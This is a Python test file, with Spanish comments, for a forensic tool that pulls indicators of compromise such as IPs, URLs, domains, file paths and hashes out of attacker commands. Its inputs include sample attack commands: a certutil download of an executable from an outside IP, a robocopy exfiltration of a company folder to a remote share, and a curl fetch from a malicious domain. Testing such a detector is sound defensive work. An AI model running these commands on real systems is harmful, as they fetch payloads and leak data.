from app.modules.tracking.indicators import extraer_indicadores


def _valores(indicadores, tipo):
    return sorted(i.valor for i in indicadores if i.tipo == tipo)


def test_extrae_ip_publica_del_comando():
    ind = extraer_indicadores("ping 45.132.192.18")
    assert _valores(ind, "ip_publica") == ["45.132.192.18"]


def test_distingue_ip_privada_de_publica():
    """La IP del atacante suele ser publica; una privada apunta a maquina
    interna. Mezclarlas obligaria al perito a separarlas a mano."""
    ind = extraer_indicadores("conexion desde 192.168.10.240 hacia 45.132.192.18")
    assert _valores(ind, "ip_privada") == ["192.168.10.240"]
    assert _valores(ind, "ip_publica") == ["45.132.192.18"]


def test_ip_invalida_no_se_extrae():
    ind = extraer_indicadores("version 999.1.1.1 y build 1.2.3.4.5")
    assert _valores(ind, "ip_publica") == []
    assert _valores(ind, "ip_privada") == []


def test_url_y_su_host_como_indicador_propio():
    ind = extraer_indicadores(
        "certutil -urlcache -split -f http://45.132.192.18/svc.exe C:\\Windows\\Temp\\svc.exe"
    )
    assert _valores(ind, "url") == ["http://45.132.192.18/svc.exe"]
    # El host se extrae ADEMAS como IP: si esa misma IP reaparece en una
    # exfiltracion, el perito tiene que verlo sin leer las URLs una a una.
    assert _valores(ind, "ip_publica") == ["45.132.192.18"]
    assert _valores(ind, "ruta") == ["C:\\Windows\\Temp\\svc.exe"]


def test_ruta_unc_de_exfiltracion():
    ind = extraer_indicadores("robocopy C:\\Contabilidad \\\\185.220.101.7\\exfil /E")
    rutas = _valores(ind, "ruta")
    assert "\\\\185.220.101.7\\exfil" in rutas
    assert "C:\\Contabilidad" in rutas
    # el host del recurso de red es el destino de la fuga: indicador propio
    assert _valores(ind, "ip_publica") == ["185.220.101.7"]


def test_misma_ip_en_descarga_y_exfiltracion_se_ve_como_ip():
    """El caso que motiva extraer el host: la IP del atacante aparece dentro
    de una URL en un comando y dentro de una UNC en otro. Si solo se guardara
    la URL y la ruta, nadie veria que es la misma maquina."""
    descarga = extraer_indicadores(
        "certutil -urlcache -f http://185.220.101.7/upd.exe C:\\Temp\\upd.exe"
    )
    exfil = extraer_indicadores("robocopy C:\\Datos \\\\185.220.101.7\\exfil /E")
    assert _valores(descarga, "ip_publica") == ["185.220.101.7"]
    assert _valores(exfil, "ip_publica") == ["185.220.101.7"]


def test_host_de_url_con_dominio_se_extrae_como_dominio():
    ind = extraer_indicadores("curl -o x http://panel.ejemplo-malo.net/a")
    assert _valores(ind, "dominio") == ["panel.ejemplo-malo.net"]


def test_nombre_de_fichero_no_se_confunde_con_dominio():
    """`svc.exe` o `auth.log` encajan en el patron de dominio; si no se
    filtran, la investigacion se llena de dominios inventados."""
    ind = extraer_indicadores("ejecuta svc.exe y revisa auth.log")
    assert _valores(ind, "dominio") == []


def test_dominio_real_si_se_extrae():
    ind = extraer_indicadores("nslookup panel-control.ejemplo-malo.net")
    assert _valores(ind, "dominio") == ["panel-control.ejemplo-malo.net"]


def test_hash_y_email():
    ind = extraer_indicadores(
        "hash 5d41402abc4b2a76b9719d911017c592 aviso a soporte@empresa.com"
    )
    assert _valores(ind, "hash") == ["5d41402abc4b2a76b9719d911017c592"]
    assert _valores(ind, "email") == ["soporte@empresa.com"]


def test_extrae_tambien_de_la_salida():
    """Muchos indicadores solo aparecen en la salida del comando: ahi esta
    la IP que de verdad resolvio el atacante."""
    ind = extraer_indicadores("nslookup panel.malo.net", salida="Address: 45.132.192.18")
    assert _valores(ind, "ip_publica") == ["45.132.192.18"]
    assert [i.origen for i in ind if i.tipo == "ip_publica"] == ["salida"]


def test_el_origen_comando_gana_al_de_salida():
    ind = extraer_indicadores("ping 45.132.192.18", salida="Reply from 45.132.192.18")
    ips = [i for i in ind if i.tipo == "ip_publica"]
    assert len(ips) == 1, "no debe duplicarse el mismo valor"
    assert ips[0].origen == "comando"


def test_comando_sin_indicadores_devuelve_lista_vacia():
    assert extraer_indicadores("whoami") == []
    assert extraer_indicadores("hostname", salida="WS-CONTA07") == []
